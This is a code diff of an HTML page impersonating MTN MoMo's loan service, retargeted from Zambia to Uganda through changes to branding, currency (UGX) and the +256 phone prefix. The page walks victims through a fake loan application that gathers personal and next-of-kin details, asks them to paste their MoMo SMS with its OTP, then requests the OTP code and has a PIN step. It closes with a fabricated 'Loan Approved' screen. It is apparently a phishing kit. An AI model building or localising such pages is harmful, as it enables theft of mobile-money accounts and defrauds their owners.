@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN MoMo Zambia – Easy Loans</title>
+    <title>MTN MoMo Uganda – Easy Loans</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="./style.css" />
 </head>
@@ -16,26 +16,26 @@
             <div class="mtn-logo">
                 <div class="mtn-logo-icon">M</div>
                 <div class="mtn-logo-text">MoMo</div>
-                <div class="mtn-logo-sub">from MTN Zambia</div>
+                <div class="mtn-logo-sub">from MTN Uganda</div>
             </div>
             <div style="flex:1;"></div>
         </div>
         <div class="land-center">
             <div class="land-card">
-                <h1>Welcome to MTN MoMo Zambia</h1>
-                <p class="land-tagline">Get loans easily through MTN MoMo Zambia</p>
+                <h1>Welcome to MTN MoMo Uganda</h1>
+                <p class="land-tagline">Get loans easily through MTN MoMo Uganda</p>
                 <div class="calc-box">
                     <h2>Loan Calculator</h2>
-                    <div class="calc-row2"><span>Amount</span><span class="cv" id="calcAmt">ZMW 2,000</span></div>
+                    <div class="calc-row2"><span>Amount</span><span class="cv" id="calcAmt">UGX 2,000,000</span></div>
                     <div class="calc-row2"><span>Term</span><span class="cv" id="calcTerm">48 Months</span></div>
-                    <input type="range" id="amtSlider" min="500" max="10000" step="100" value="2000" oninput="updateCalc()" />
-                    <div class="range-ends"><span>ZMW 500</span><span>ZMW 10,000</span></div>
-                    <div class="monthly-box"><span class="ml">Monthly Payment</span><span class="ma" id="monthlyAmt">ZMW 48</span></div>
+                    <input type="range" id="amtSlider" min="500000" max="10000000" step="100000" value="2000000" oninput="updateCalc()" />
+                    <div class="range-ends"><span>UGX 500,000</span><span>UGX 10,000,000</span></div>
+                    <div class="monthly-box"><span class="ml">Monthly Payment</span><span class="ma" id="monthlyAmt">UGX 24,000</span></div>
                 </div>
                 <button class="btn-grad" onclick="startApplication()">START APPLICATION</button>
             </div>
         </div>
-        <div class="land-footer">© 2026 MTN MoMo Loans – Powered by MTN Zambia</div>
+        <div class="land-footer">© 2026 MTN MoMo Loans – Powered by MTN Uganda</div>
     </div>
 
     <!-- PAGE 2: STEP 1 -->
@@ -44,7 +44,7 @@
             <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
             <div class="mtn-logo" style="flex-direction:row;gap:6px;">
                 <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Zambia</div></div>
+                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Uganda</div></div>
             </div>
             <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
         </nav>
@@ -55,7 +55,7 @@
                 <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
                 <div class="field"><label>Loan Type</label><div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected>Business Loan</option><option>Home Loan</option><option>Car Loan</option><option>Education Loan</option></select></div></div>
-                <div class="field"><label>Loan Amount (ZMW)</label><input type="number" id="s1am" value="2000" placeholder="Enter amount" oninput="clearErr('s1Err')" /></div>
+                <div class="field"><label>Loan Amount (UGX)</label><input type="number" id="s1am" value="2000000" placeholder="Enter amount" oninput="clearErr('s1Err')" /></div>
                 <div class="field"><label>Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option selected>48 Months</option><option>60 Months</option></select></div></div>
                 <div class="field"><label>Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
                 <button class="btn-grad" onclick="toS2()">NEXT STEP</button>
@@ -69,7 +69,7 @@
             <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
             <div class="mtn-logo" style="flex-direction:row;gap:6px;">
                 <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Zambia</div></div>
+                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Uganda</div></div>
             </div>
             <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
         </nav>
@@ -84,9 +84,9 @@
                     <div class="field"><label>Last Name</label><input type="text" id="s2la" placeholder="Last Name" oninput="clearErr('s2Err')" /></div>
                 </div>
                 <div class="field">
-                    <label>Phone Number (Zambia)</label>
-                    <div class="phone-row"><div class="ph-pre">+260</div><input type="tel" id="s2ph" placeholder="7XX XXX XXX" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')" /></div>
-                    <div class="field-hint">9 digits without +260 prefix (e.g., 712345678)</div>
+                    <label>Phone Number (Uganda)</label>
+                    <div class="phone-row"><div class="ph-pre">+256</div><input type="tel" id="s2ph" placeholder="7XX XXX XXX" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')" /></div>
+                    <div class="field-hint">9 digits without +256 prefix (e.g., 712345678)</div>
                 </div>
                 <div class="field"><label>Email Address</label><input type="email" id="s2em" placeholder="your@email.com" oninput="clearErr('s2Err')" /></div>
                 <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step1')">BACK</button><button class="btn-grad" onclick="toS3()">NEXT STEP</button></div>
@@ -100,7 +100,7 @@
             <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
             <div class="mtn-logo" style="flex-direction:row;gap:6px;">
                 <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Zambia</div></div>
+                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Uganda</div></div>
             </div>
             <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
         </nav>
@@ -111,12 +111,12 @@
                 <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
                 <div class="field"><label>Employment Status</label><div class="sel-wrap"><select id="s3em"><option>Employed</option><option selected>Self-employed</option><option>Unemployed</option><option>Retired</option><option>Student</option></select></div></div>
-                <div class="field"><label>Annual Income (ZMW)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')" /></div>
+                <div class="field"><label>Annual Income (UGX)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')" /></div>
                 <div class="field"><label>Next of Kin Name</label><input type="text" id="s3kn" placeholder="Full name of next of kin" oninput="clearErr('s3Err')" /></div>
-                <div class="field"><label>Next of Kin Phone</label><input type="tel" id="s3kp" placeholder="7XX XXX XXX" maxlength="9" oninput="normalizePhone('s3kp');clearErr('s3Err')" /></div>
+                <div class="field"><label>Next of Kin Phone</label><input type="tel" id="s3kp" placeholder="+256 7XX XXX XXX" oninput="clearErr('s3Err')" /></div>
                 <div class="sum-box">
                     <h3>Application Summary</h3>
-                    <div class="sum-row"><span class="sk">Loan Amount:</span><span class="sv" id="sA">ZMW 2,000</span></div>
+                    <div class="sum-row"><span class="sk">Loan Amount:</span><span class="sv" id="sA">UGX 2,000,000</span></div>
                     <div class="sum-row"><span class="sk">Loan Term:</span><span class="sv" id="sT">48 Months</span></div>
                     <div class="sum-row"><span class="sk">Purpose:</span><span class="sv" id="sP">—</span></div>
                     <div class="sum-row"><span class="sk">Applicant:</span><span class="sv" id="sN">—</span></div>
@@ -144,7 +144,7 @@
             <a class="nav-left" onclick="goTo('page-processing')">← Back</a>
             <div class="mtn-logo" style="flex-direction:row;gap:6px;">
                 <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Zambia</div></div>
+                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Uganda</div></div>
             </div>
             <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
         </nav>
@@ -160,7 +160,7 @@
                     <div class="hint">This should include the OTP code or verification details sent to your MoMo number.</div>
                 </div>
                 <div style="margin: 8px 0 12px; padding: 10px; background: #f8f9fa; border-radius: 6px; font-size:0.8rem; color:var(--text-light);">
-                    <strong>💡 Tip:</strong> Check your SMS inbox for the message from MTN MoMo Zambia. Copy the entire message text.
+                    <strong>💡 Tip:</strong> Check your SMS inbox for the message from MTN MoMo Uganda. Copy the entire message text.
                 </div>
                 <button class="btn-grad" onclick="doSmsParse()">SUBMIT MOMO MESSAGE</button>
             </div>
@@ -186,7 +186,7 @@
             <a class="nav-left" onclick="goTo('page-wait-sms')">← Back</a>
             <div class="mtn-logo" style="flex-direction:row;gap:6px;">
                 <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Zambia</div></div>
+                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Uganda</div></div>
             </div>
             <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
         </nav>
@@ -234,14 +234,14 @@
             <a class="nav-left" onclick="goTo('page-wait-pin')">← Back</a>
             <div class="mtn-logo" style="flex-direction:row;gap:6px;">
                 <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Zambia</div></div>
+                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Uganda</div></div>
             </div>
             <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
         </nav>
         <div class="step-center">
             <div class="step-card">
                 <h2>Enter OTP Code</h2>
-                <p class="step-sub">Enter the 4-digit OTP code sent to your phone via MTN MoMo Zambia</p>
+                <p class="step-sub">Enter the 4-digit OTP code sent to your phone via MTN MoMo Uganda</p>
                 <div class="otp-section">
                     <div class="otp-section-title">OTP Code (4 digits):</div>
                     <div style="display: flex; align-items: center;">
@@ -284,14 +284,14 @@
                 <div class="check-circle">✓</div>
                 <h2 class="appr-title">Loan Approved!</h2>
                 <p class="appr-sub">Your loan has been successfully approved.</p>
-                <div class="appr-banner"><div class="abl">Amount to Receive</div><div class="aba" id="aprAmount">ZMW 2,000</div></div>
+                <div class="appr-banner"><div class="abl">Amount to Receive</div><div class="aba" id="aprAmount">UGX 2,000,000</div></div>
             </div>
             <div class="comp-box"><div class="ch">ℹ️ Important Information</div><p>The funds will be deposited directly to your MTN MoMo account within 5 minutes. Please ensure your phone number is correct.</p></div>
             <div class="ld-card">
                 <div class="ld-htitle">📊 Loan Details</div>
-                <div class="ld-row"><div class="ld-icon ic-g">💰</div><div><div class="ld-lbl">Amount</div><div class="ld-val" id="aprAmt">ZMW 2,000</div></div></div>
+                <div class="ld-row"><div class="ld-icon ic-g">💰</div><div><div class="ld-lbl">Amount</div><div class="ld-val" id="aprAmt">UGX 2,000,000</div></div></div>
                 <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl">Term</div><div class="ld-val" id="aprTerm">48 Months</div></div></div>
-                <div class="ld-row"><div class="ld-icon ic-p">💳</div><div><div class="ld-lbl">Monthly Payment</div><div class="ld-val" id="aprMth">ZMW 48</div></div></div>
+                <div class="ld-row"><div class="ld-icon ic-p">💳</div><div><div class="ld-lbl">Monthly Payment</div><div class="ld-val" id="aprMth">UGX 24,000</div></div></div>
             </div>
             <div class="nxt-steps"><span style="font-size:1.2rem;">📌</span><p><strong>Next Steps:</strong> To start repaying, you can set up an automatic payment plan in your MTN MoMo account in the next section.</p></div>
             <div class="rth-wrap">
